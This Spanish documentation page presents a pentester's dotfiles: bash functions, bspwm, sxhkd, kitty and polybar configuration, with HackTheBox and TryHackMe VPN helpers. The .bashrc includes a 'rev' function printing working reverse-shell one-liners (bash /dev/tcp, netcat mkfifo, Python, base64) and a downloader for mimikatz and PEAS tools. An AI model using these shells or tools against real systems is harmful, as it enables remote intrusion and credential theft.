---
title: Configuración
description: Archivos de configuración del sistema y scripts
tags: [configuration, scripts]
lang: es
order: 99
parent: setup
---

## bash

### .bashrc

```bash
source $HOME/.config/colors/colors.sh

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

export NPM_CONFIG_USERCONFIG=$HOME/.config/npm/npmrc

alias ls='ls --color=auto'
alias grep='grep --color=auto'
alias burp='/usr/bin/burpsuite > /dev/null 2>&1 & disown'
alias fire='/usr/bin/firefox > /dev/null 2>&1 & disown'
alias wire='/usr/bin/wireshark > /dev/null 2>&1 & disown'
alias tor='/usr/bin/torbrowser-launcher > /dev/null 2>&1 & disown'
alias obsidian='/usr/bin/obsidian > /dev/null 2>&1 & disown'
alias dcd='/usr/bin/discord > /dev/null 2>&1 & disown'
alias steam='/usr/bin/steam > /dev/null 2>&1 & disown'
alias stremio='/usr/bin/stremio > /dev/null 2>&1 & disown'
alias obs='/usr/bin/obs > /dev/null 2>&1 & disown'
alias kden='/usr/bin/kdenlive > /dev/null 2>&1 & disown'
alias gimp='/usr/bin/gimp > /dev/null 2>&1 & disown'
alias vbox='/usr/bin/virtualbox > /dev/null 2>&1 & disown'

PS1='\[\e[32m\][ \[\e[0m\]\[\e[38;2;59;113;202m\]\w\[\e[0m\]\[\e[32m\] ]\[\e[0m\] \[\e[38;2;159;166;178m\] \[\e[0m\] '

# Sets or clears the target IP (and optional port) displayed in Polybar
target(){
    local target_file="$HOME/.config/polybar/scripts/target.txt"

    if [[ $# -eq 0 ]]; then
        # No arguments — clear the target
        echo "" > "$target_file"
    elif [[ $# -eq 1 ]]; then
        # Split IP and optional port
        local ip="${1%%:*}"
        local port="${1##*:}"
        [[ "$ip" == "$port" ]] && port=""

        # Validate IP format with regex
        if [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            local valid=true
            # Validate each octet is between 0 and 255
            IFS='.' read -ra octets <<< "$ip"
            for octet in "${octets[@]}"; do
                if [[ $octet -gt 255 ]]; then
                    valid=false
                    break
                fi
            done

            # Validate port if provided
            if [[ -n "$port" ]] && ! [[ "$port" =~ ^[0-9]+$ && $port -ge 1 && $port -le 65535 ]]; then
              echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: invalid port (must be between 1 and 65535)"
                return 1
            fi

            if $valid; then
                echo "$1" > "$target_file"
            else
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: invalid IP (octets must be between 0 and 255)"
            fi
        else
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$ip' is not a valid IP address"
            echo -e "\nUsage: target [ip] or target [ip:port]"
            echo "  target 10.10.10.10        → set target IP in Polybar"
            echo "  target 10.10.10.10:8080   → set target IP and port in Polybar"
            echo "  target                    → clear target from Polybar"
            echo
        fi
    else
        echo -e "\nUsage: target [ip] or target [ip:port]"
        echo "  target 10.10.10.10        → set target IP in Polybar"
        echo "  target 10.10.10.10:8080   → set target IP and port in Polybar"
        echo "  target                    → clear target from Polybar"
    fi
}

# Extracts open ports from any nmap output file (.gnmap, .nmap, .xml)
ports(){
    local usage="Usage: ports <file>
  ports lookup.gnmap   → parses grepable nmap output
  ports lookup.nmap    → parses normal nmap output
  ports lookup.xml     → parses XML nmap output"

    if [[ $# -eq 0 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no file specified\n"
        echo "$usage"
        echo
        return 1
    fi

    if [[ $# -gt 1 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: too many arguments\n"
        echo "$usage"
        echo
        return 1
    fi

    local file="$1"

    if [[ ! -f "$file" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$file' is not a valid file\n"
        echo "$usage"
        echo
        return 1
    fi

    local result

    case "$file" in
        *.gnmap)
            result=$(grep -oP '\d{1,5}/open' "$file" | awk -F'/' '{print $1}' | sort -un | xargs | tr ' ' ',')
            ;;
        *.nmap)
            result=$(grep -oP '^\s*\d{1,5}/\w+\s+open' "$file" | grep -oP '^\s*\d+' | tr -d ' ' | sort -un | xargs | tr ' ' ',')
            ;;
        *.xml)
            result=$(grep 'state="open"' "$file" | grep -oP 'portid="\K\d+' | sort -un | xargs | tr ' ' ',')
            ;;
        *)
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unrecognized file extension (expected .gnmap, .nmap or .xml)\n"
            echo "$usage"
            echo
            return 1
            ;;
    esac

    if [[ -z "$result" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] No open ports found in '$file'\n"
        echo
        return 1
    fi

    echo "$result"

    if command -v xclip &>/dev/null; then
        echo -n "$result" | xclip -selection clipboard
    else
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] xclip not found — install it with: sudo pacman -S xclip"
        echo
    fi
}

# Obfuscates sensitive data (flags, passwords, users, etc.) and copies to clipboard
mask(){
    local partial=false

    if [[ "$1" == "-p" ]]; then
        partial=true
        shift
    fi

    if [[ $# -eq 0 ]]; then
        echo
        echo "Usage: mask [-p] <value>"
        echo "  mask <value>     → fully mask value"
        echo "  mask -p <value>  → partially mask, keeping some chars at start and end"
        echo
        return 1
    fi

    local input="$1"
    local len=${#input}
    local masked

    if $partial; then
        local visible

        if [[ $len -lt 6 ]]; then
            visible=0
        elif [[ $len -lt 11 ]]; then
            visible=1
        elif [[ $len -lt 21 ]]; then
            visible=2
        else
            visible=3
        fi

        if [[ $visible -eq 0 ]]; then
            masked=$(printf '%0.s*' $(seq 1 $len))
        else
            local start="${input:0:$visible}"
            local end="${input: -$visible}"
            local mid_len=$(( len - visible * 2 ))
            local mid
            mid=$(printf '%0.s*' $(seq 1 $mid_len))
            masked="${start}${mid}${end}"
        fi
    else
        masked=$(printf '%0.s*' $(seq 1 $len))
    fi

    echo
    echo "$masked"
    echo

    if command -v xclip &>/dev/null; then
        echo -n "$masked" | xclip -selection clipboard
    else
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] xclip not found — install it with: sudo pacman -S xclip\n"
    fi
}

# Python venv manager
venv(){
    local venv_dir="venv"
    local libs=()

    # Parse -l flag and collect libraries
    local args=()
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -l)
                shift
                while [[ $# -gt 0 && "$1" != -* ]]; do
                    libs+=("$1")
                    shift
                done
                ;;
            *) args+=("$1"); shift ;;
        esac
    done
    set -- "${args[@]}"

    case "$1" in
        -d)
            if [[ -z "$VIRTUAL_ENV" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no active virtual environment\n"
                return 1
            fi
            deactivate
            ;;
        -r)
            if [[ ! -d "$venv_dir" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no venv found in current directory\n"
                return 1
            fi
            if [[ -n "$VIRTUAL_ENV" ]]; then
                deactivate
            fi
            rm -rf "$venv_dir"
            echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] venv removed\n"
            ;;
        "")
            if [[ -d "$venv_dir" ]]; then
                source "$venv_dir/bin/activate"
                echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] venv activated\n"
            else
                python3 -m venv "$venv_dir"
                source "$venv_dir/bin/activate"
                echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] venv created and activated\n"
            fi

            if [[ ${#libs[@]} -gt 0 ]]; then
                echo -e "[${ANSI_SUCCESS}*${COLOR_RESET}] Installing libraries: ${libs[*]}\n"
                python3 -m pip install "${libs[@]}"
            fi
            ;;
        *)
            echo
            echo "Usage: venv [-d|-r] [-l lib1 lib2 ...]"
            echo "  venv                          → create venv if needed, then activate"
            echo "  venv -l requests flask        → create/activate and install libraries"
            echo "  venv -d                       → deactivate current venv"
            echo "  venv -r                       → deactivate (if active) and remove venv"
            echo
            return 1
            ;;
    esac
}

# Pentesting tools downloader
tools(){
    local usage="Usage: tools <tool> [arch]
  tools linpeas            → download linpeas.sh as lp.sh
  tools winpeas 32|64      → download winPEASx86.exe or winPEASx64.exe
  tools mimikatz 32|64     → extract and download mimikatz.exe (32 or 64 bit)
  tools enum4linux         → clone and setup enum4linux-ng"

    if [[ $# -eq 0 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no tool specified\n"
        echo "$usage"
        echo
        return 1
    fi

    case "$1" in
        linpeas)
            local url="https://github.com/peass-ng/PEASS-ng/releases/download/20260301-38d838d2/linpeas.sh"
            local output="lp.sh"
            if [[ -f "$output" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading linpeas...\n"
            if curl -sL "$url" -o "$output"; then
                chmod +x "$output"
                echo -e "[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
            else
                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
                rm -f "$output"
                return 1
            fi
            ;;

        winpeas)
            if [[ -z "$2" || ( "$2" != "32" && "$2" != "64" ) ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: specify architecture: tools winpeas 32|64\n"
                return 1
            fi
            local url output
            if [[ "$2" == "32" ]]; then
                url="https://github.com/peass-ng/PEASS-ng/releases/download/20260301-38d838d2/winPEASx86.exe"
                output="winPEASx86.exe"
            else
                url="https://github.com/peass-ng/PEASS-ng/releases/download/20260301-38d838d2/winPEASx64.exe"
                output="winPEASx64.exe"
            fi
            if [[ -f "$output" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading winPEAS ($2-bit)...\n"
            if curl -sL "$url" -o "$output"; then
                echo -e "[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
            else
                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
                rm -f "$output"
                return 1
            fi
            ;;

        mimikatz)
            if [[ -z "$2" || ( "$2" != "32" && "$2" != "64" ) ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: specify architecture: tools mimikatz 32|64\n"
                return 1
            fi
            local url="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
            local zipfile="mimikatz_trunk.zip"
            local output="mimikatz.exe"
            if [[ -f "$output" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading mimikatz...\n"
            if ! curl -sL "$url" -o "$zipfile"; then
                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
                rm -f "$zipfile"
                return 1
            fi
            local inner_path
            if [[ "$2" == "32" ]]; then
                inner_path="Win32/mimikatz.exe"
            else
                inner_path="x64/mimikatz.exe"
            fi
            echo -e "[${ANSI_WARNING}*${COLOR_RESET}] Extracting $inner_path...\n"
            if unzip -p "$zipfile" "$inner_path" > "$output"; then
                rm -f "$zipfile"
                echo -e "[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
            else
                echo -e "[${ANSI_DANGER}!${COLOR_RESET}] Extraction failed\n"
                rm -f "$zipfile" "$output"
                return 1
            fi
            ;;

        enum4linux)
            if [[ -d "enum4linux-ng" ]]; then
                echo -e "[${ANSI_DANGER}!${COLOR_RESET}] enum4linux-ng directory already exists\n"
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Cloning enum4linux-ng...\n"
            if ! git clone https://github.com/cddmp/enum4linux-ng.git; then
                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Clone failed\n"
                return 1
            fi
            cd enum4linux-ng || return 1
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Setting up virtual environment..."
            if ! python3 -m venv venv; then
                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Failed to create venv — try: sudo pacman -S python-virtualenv\n"
                cd ..
                return 1
            fi
            if ! source venv/bin/activate; then
                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Failed to activate venv\n"
                cd ..
                return 1
            fi
            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Installing dependencies...\n"
            if ! python3 -m pip install wheel; then
                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Failed to install wheel\n"
                return 1
            fi
            if ! python3 -m pip install -r requirements.txt; then
                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Failed to install requirements\n"
                return 1
            fi
            echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] enum4linux-ng ready — venv activated\n"
            ;;
        *)
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unknown tool '$1'\n"
            echo "$usage"
            echo
            return 1
            ;;
    esac
}

# VPN manager for HTB, HTB Academy and THM
vpn(){
    local config_dir="$HOME/.config/vpn"
    local usage="Usage: vpn -c <htbm|htbc|htbv|htba|thm>
  vpn -c htbm  → connect to HackTheBox machines
  vpn -c htbc  → connect to HackTheBox Competitive
  vpn -c htbv  → connect to HackTheBox VIP
  vpn -c htba  → connect to HackTheBox Academy
  vpn -c thm   → connect to TryHackMe"

    if [[ $# -eq 0 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no arguments provided"
        echo
        echo "$usage"
        echo
        return 1
    fi

    if [[ "$1" != "-c" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unknown flag '$1'"
        echo
        echo "$usage"
        echo
        return 1
    fi

    if [[ -z "$2" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no VPN specified"
        echo
        echo "$usage"
        echo
        return 1
    fi

    local config

    case "$2" in
        htbm)  config="$config_dir/htbm.ovpn"  ;;
        htbc) config="$config_dir/htbc.ovpn"  ;;
        htbv) config="$config_dir/htbv.ovpn"  ;;
        htba) config="$config_dir/htba.ovpn" ;;
        thm)  config="$config_dir/thm.ovpn"  ;;
        *)
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unknown VPN '$2' (expected htb, htba or thm)"
            echo
            echo "$usage"
            echo
            return 1
            ;;
    esac

    if [[ ! -f "$config" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: config file not found at '$config'\n"
        return 1
    fi

    echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Connecting to $2 VPN...\n"
    sudo openvpn --config "$config"
}

# Copies file contents to clipboard
clip(){
    if [[ $# -eq 0 ]]; then
        echo
        echo -e "Usage: clip <file>"
        echo
        return 1
    fi

    if [[ ! -f "$1" ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$1' is not a valid file\n"
        return 1
    fi

    if ! command -v xclip &>/dev/null; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] xclip not found — install it with: sudo pacman -S xclip\n"
        return 1
    fi

    xclip -sel clip < "$1"
    echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] '$1' copied to clipboard\n"
}

# Generates reverse shells for a given attacker IP and port
rev(){
    local usage="Usage: rev <ip> <port>
  rev 10.10.15.113 4444  → print ready-to-use reverse shells"

    if [[ $# -ne 2 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: expected 2 arguments\n"
        echo "$usage"
        echo
        return 1
    fi

    local ip="$1"
    local port="$2"

    # Validate IP
    if ! [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}]Error: '$ip' is not a valid IP address\n"
        return 1
    fi

    # Validate port
    if ! [[ "$port" =~ ^[0-9]+$ ]] || [[ $port -lt 1 || $port -gt 65535 ]]; then
        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$port' is not a valid port (1-65535)\n"
        return 1
    fi

    # Base64 reverse shell
    local b64
    b64=$(echo "bash -i >& /dev/tcp/${ip}/${port} 0>&1" | base64 | tr -d '\n')

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Bash${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "bash -c \"bash -i >& /dev/tcp/${ip}/${port} 0>&1\""

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Bash URL-encoded${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "bash+-c+\"bash+-i+>%26+/dev/tcp/${ip}/${port}+0>%261\""

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Netcat (mkfifo)${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f"

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Python${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    echo ""
    echo -e "━━━ ${ANSI_SUCCESS}Base64${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "echo ${b64} | base64 -d | bash"
    echo ""
}

# Wordlist manager — save and display frequently used SecLists paths
lists(){
    local store="$HOME/.config/wordlists.txt"
    local usage="Usage: lists [-l <path>] [-r <path>]
  lists              → show all saved wordlists
  lists -l <path>    → add a wordlist path
  lists -r <path>    → remove a wordlist path"

    # Create store file if it doesn't exist
    [[ ! -f "$store" ]] && touch "$store"

    case "$1" in
        "")
            if [[ ! -s "$store" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] No wordlists saved yet. Use: lists -l <path>\n"
                return 0
            fi
            echo ""
            echo -e "━━━ ${ANSI_SUCCESS}Saved wordlists${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            local i=1
            while IFS= read -r line; do
                echo -e "[${ANSI_WARNING}$i${COLOR_RESET}] $line"
                (( i++ ))
            done < "$store"
            echo ""
            ;;
        -l)
            if [[ -z "$2" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no path provided\n"
                echo "$usage"
                echo
                return 1
            fi
            local path="$2"
            if [[ ! -f "$path" ]]; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$path' does not exist\n"
                return 1
            fi
            if grep -qxF "$path" "$store"; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] '$path' is already saved\n"
                return 0
            fi
            echo "$path" >> "$store"
            echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] Added: $path\n"
            ;;
        -r)
            if [[ -z "$2" ]]; then
                echo -e "[${ANSI_DANGER}!${COLOR_RESET}] Error: no path provided\n"
                echo
                echo "$usage"
                return 1
            fi
            if ! grep -qxF "$2" "$store"; then
                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$2' not found in saved lists\n"
                return 1
            fi
            grep -vxF "$2" "$store" > "${store}.tmp"; mv "${store}.tmp" "$store"
            echo -e "\n[${ANSI_SUCCESS}-${COLOR_RESET}] Removed: $2\n"
            ;;
        *)
            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unknown flag '$1'\n"
            echo "$usage"
            echo
            return 1
            ;;
    esac
}
```

## bspwm

### bspwmrc

```bash
#!/bin/sh

pgrep -x sxhkd > /dev/null || /usr/bin/sxhkd &
pgrep -x picom > /dev/null || /usr/bin/picom &
$HOME/.config/dunst/launch.sh &
$HOME/.config/plank/launch.sh &
pgrep -x discord > /dev/null || discord --start-minimized &

bspc monitor DP-0 -d I II III IV V
bspc monitor HDMI-0 -d VI VII VIII IX X

bspc config border_width         1
bspc config window_gap          10
bspc config split_ratio          0.5
bspc config borderless_monocle   true
bspc config gapless_monocle      true

$HOME/.fehbg &
xset r rate 250 25
/usr/bin/numlockx on &

$HOME/.config/polybar/launch.sh &

bspc rule -a steam state=floating
bspc rule -a obsidian state=floating
bspc rule -a discord state=floating
bspc rule -a kdenlive state=floating
```

## bspwm_resize.sh

```bash
#!/usr/bin/env sh

if bspc query -N -n focused.floating > /dev/null; then
	step=20
else
	step=100
fi

case "$1" in
	west) dir=right; falldir=left; x="-$step"; y=0;;
	east) dir=right; falldir=left; x="$step"; y=0;;
	north) dir=top; falldir=bottom; x=0; y="-$step";;
	south) dir=top; falldir=bottom; x=0; y="$step";;
esac

bspc node -z "$dir" "$x" "$y" || bspc node -z "$falldir" "$x" "$y"
```

## sxhkd

### sxhkdrc

```bash
# terminal emulator
super + Return
	/usr/bin/kitty

# make sxhkd reload its configuration files:
super + Escape
	pkill -USR1 -x sxhkd

# quit/restart bspwm
super + alt + {q,r}
	bspc {quit,wm -r}

# close and kill
super + {_,shift + }w
	bspc node -{c,k}

# alternate between the tiled and monocle layout
super + m
	bspc desktop -l next

# send the newest marked node to the newest preselected node
super + y
	bspc node newest.marked.local -n newest.!automatic.local

# swap the current node and the biggest window
super + g
	bspc node -s biggest.window

# set the window state
super + {t,shift + t,s,f}
	bspc node -t {tiled,pseudo_tiled,floating,fullscreen}

# set the node flags
super + ctrl + {m,x,y,z}
	bspc node -g {marked,locked,sticky,private}

# focus the node in the given direction
super + {_,shift + }{Left,Down,Up,Right}
	bspc node -{f,s} {west,south,north,east}

# focus the node for the given path jump
super + {p,b,comma,period}
	bspc node -f @{parent,brother,first,second}

# focus the next/previous window in the current desktop
super + {_,shift + }c
	bspc node -f {next,prev}.local.!hidden.window

# focus the next/previous desktop in the current monitor
super + bracket{left,right}
	bspc desktop -f {prev,next}.local

# focus the last node/desktop
super + {grave,Tab}
	bspc {node,desktop} -f last

# focus the older or newer node in the focus history
super + {o,i}
	bspc wm -h off; \
	bspc node {older,newer} -f; \
	bspc wm -h on

# focus or send to the given desktop
super + {_,shift + }{1-9,0}
	bspc {desktop -f,node -d} '^{1-9,10}'

# preselect the direction
super + ctrl + {Left,Down,Up,Right}
	bspc node -p {west,south,north,east}

# preselect the ratio
super + ctrl + {1-9}
	bspc node -o 0.{1-9}

# cancel the preselection for the focused node
super + ctrl + space
	bspc node -p cancel

# cancel the preselection for the focused desktop
super + ctrl + shift + space
	bspc query -N -d | xargs -I id -n 1 bspc node id -p cancel

# move a floating window
super + shift + alt + {Left,Down,Up,Right}
	bspc node -v {-20 0,0 20,0 -20,20 0}

# Cambiar la capa de la ventana (Mandar al fondo / Restaurar al frente)
super + shift + {comma, period}
    bspc node -l {below, normal}

# custom resize
super + alt + {Left,Down,Up,Right}
	$HOME/.config/bspwm/scripts/bspwm_resize.sh {west,south,north,east}

# flameshot
super + shift + alt + f
  /usr/bin/flameshot gui

# volume up
XF86AudioRaiseVolume
    wpctl set-volume @DEFAULT_AUDIO_SINK@ 1%+

# volume down
XF86AudioLowerVolume
    wpctl set-volume @DEFAULT_AUDIO_SINK@ 1%-

# mute volume
XF86AudioMute
    wpctl set-mute @DEFAULT_AUDIO_SINK@ toggle

# Control de reproducción de Spotify (MPRIS)
XF86AudioPlay
    playerctl --player=spotify play-pause

XF86AudioNext
    playerctl --player=spotify next

XF86AudioPrev
    playerctl --player=spotify previous

# Cerrar la notificación actual
super + n
    dunstctl close

# Cerrar todas las notificaciones activas
super + shift + n
    dunstctl close-all

# Traer la última notificación del historial (por si no la viste en pantalla)
super + alt + n
    dunstctl history-pop
```

#### Atajos de Teclado BSPWM y SXHKD

Control del Sistema

- **`super + Escape`**: Recarga la configuración de los atajos de teclado (sxhkd) sin reiniciar el sistema.
- **`super + alt + q`**: Cierra la sesión actual de bspwm.
- **`super + alt + r`**: Reinicia bspwm manteniendo las aplicaciones abiertas.

Gestión de Ventanas (Nodos)

- **`super + w`**: Cierra la ventana actual de forma normal.
- **`super + shift + w`**: Fuerza el cierre (mata) de la ventana actual si está congelada.
- **`super + m`**: Cambia el diseño del escritorio entre modo mosaico (tiled) y pantalla completa (monocle).
- **`super + y`**: Envía la última ventana marcada al espacio que haya sido preseleccionado.
- **`super + g`**: Intercambia la posición de la ventana actual con la ventana más grande del escritorio.

3. Estados y Propiedades de Ventanas

- **`super + t`**: Cambia la ventana al modo mosaico normal (tiled).
- **`super + shift + t`**: Cambia la ventana al modo pseudo-mosaico (mantiene su tamaño ideal).
- **`super + s`**: Cambia la ventana al modo flotante (floating).
- **`super + f`**: Cambia la ventana al modo pantalla completa total (fullscreen).
- **`super + ctrl + m`**: Marca la ventana actual (etiqueta para usar con otros comandos).
- **`super + ctrl + x`**: Bloquea la ventana (locked) para evitar que se cierre por error.
- **`super + ctrl + y`**: Vuelve la ventana pegajosa (sticky), haciendo que aparezca en todos los escritorios.
- **`super + ctrl + z`**: Vuelve la ventana privada (private), manteniendo su posición ante cambios externos.

4. Navegación y Enfoque

- **`super + [Flechas]`**: Cambia el enfoque a la ventana que esté en la dirección indicada (Izquierda, Abajo, Arriba, Derecha).
- **`super + shift + [Flechas]`**: Intercambia la posición de la ventana actual con la ventana que esté en esa dirección.
- **`super + p`**: Enfoca el contenedor padre de la ventana actual.
- **`super + b`**: Enfoca la ventana hermana en el árbol de bspwm.
- **`super + coma (,)`**: Enfoca la primera ventana de la rama actual.
- **`super + punto (.)`**: Enfoca la segunda ventana de la rama actual.
- **`super + c`**: Enfoca la siguiente ventana en el escritorio actual.
- **`super + shift + c`**: Enfoca la ventana anterior en el escritorio actual.
- **`super + [`**: Cambia al escritorio (área de trabajo) anterior.
- **`super + ]`**: Cambia al siguiente escritorio.
- **`super + ~`** (tecla sobre Tab): Regresa a la última ventana enfocada.
- **`super + Tab`**: Regresa al último escritorio visitado.
- **`super + o`**: Salta a la ventana más antigua en el historial de enfoque.
- **`super + i`**: Salta a la ventana más reciente en el historial de enfoque.

5. Gestión de Escritorios

- **`super + [1-0]`**: Te mueve al escritorio número 1 al 10.
- **`super + shift + [1-0]`**: Envía la ventana actual al escritorio número 1 al 10.

6. Preselección de Espacio

- **`super + ctrl + [h, j, k, l]`**: Preselecciona en qué dirección (izquierda, abajo, arriba, derecha) se abrirá la siguiente ventana.
- **`super + ctrl + [1-9]`**: Define el porcentaje de espacio (10% al 90%) que ocupará la ventana preseleccionada.
- **`super + ctrl + espacio`**: Cancela la preselección en la ventana enfocada.
- **`super + ctrl + shift + espacio`**: Cancela todas las preselecciones activas en el escritorio actual.

7. Movimiento y Redimensionado

- **`super + [Flechas]`**: Mueve la ventana actual 20 píxeles si se encuentra en modo flotante.
- **`super + alt + [Flechas]`**: Ejecuta el script externo para cambiar el tamaño de las ventanas en mosaico.

## kitty

### kitty.conf

```bash
window_margin_width 5
single_window_margin_width 0
window_padding_width 5
single_window_padding_width 4 6

font_family DejaVuSansM Nerd Font
font_size 14

map ctrl+shift+enter new_window_with_cwd
map ctrl+shift+t new_tab_with_cwd

map ctrl+left neighboring_window left
map ctrl+right neighboring_window right
map ctrl+up neighboring_window up
map ctrl+down neighboring_window down

map f1 copy_to_buffer a
map f2 paste_from_buffer a
map f3 copy_to_buffer b
map f4 paste_from_buffer b
map f5 copy_to_buffer c
map f6 paste_from_buffer c
map f7 copy_to_buffer d
map f8 paste_from_buffer d
map f9 copy_to_buffer e
map f10 paste_from_buffer e

map ctrl+shift+z toggle_layout stack

enable_audio_bell no
background_opacity 0.85
cursor #E4A11B
cursor_trail 1
cursor_trail_decay 0.1 0.4
scrollback_lines 5000
scrollbar_interactive yes
scrollbar_width 0.5
scrollbar_track_color #DC4C64
scrollbar_handle_color #14A44D
```

## polybar

### launch.sh

```bash
#!/bin/bash

source $HOME/.config/polybar/env.sh
killall -q polybar
polybar main 2>&1 | tee -a /tmp/polybar.log & disown
```

### config.ini

```bash
include-file = $HOME/.config/colors/colors.ini

[settings]
pseudo-transparency = false

[bar/main]
enable-ipc = true
wm-restack = bspwm
enable-struts = true
background = #00000000
modules-left = updates shutdown reboot logout lock date gmail vpn target pomodoro
modules-center = desk
modules-right = spotify bluetooth audio kitty discord obsidian vsc tor wire fire burp dog
width = 99%
offset-x = 0.5%
offset-y = 10
module-margin = 2pt
padding = 1
font-0 = "DejaVuSansM Nerd Font:size=14;2"
font-1 = "DejaVuSansM Nerd Font:size=10;2"
font-2 = "Symbols Nerd Font Mono:size=11"
cursor-click = pointer
cursor-scroll = ns-resize
dim-value = 0.8

[module/updates]
type = custom/script
exec = $HOME/.config/polybar/scripts/updates.sh
interval = 10
click-left = $HOME/.config/polybar/scripts/updates.sh pacman
click-right = $HOME/.config/polybar/scripts/updates.sh aur

[module/shutdown]
type = custom/text
format-font = 3
label = 󰤆
label-padding = 3pt
label-foreground = ${colors.danger}
click-left = /usr/bin/poweroff

[module/reboot]
type = custom/text
format-font = 3
label = 
label-padding = 3pt
label-foreground = ${colors.orange}
click-left = /usr/bin/reboot

[module/logout]
type = custom/text
format-font = 3
label = 
label-padding = 3pt
label-foreground = ${colors.warning}
click-left = bspc quit

[module/lock]
type = custom/text
format-font = 3
label = 󰌾
label-padding = 3pt
label-foreground = ${colors.secondary}
click-left = /usr/bin/i3lock-fancy

[module/date]
type = internal/date
interval = 1.0
time = %H:%M
time-alt = %H:%M:%S
date = %d-%m%
date-alt = %d-%m-%Y%
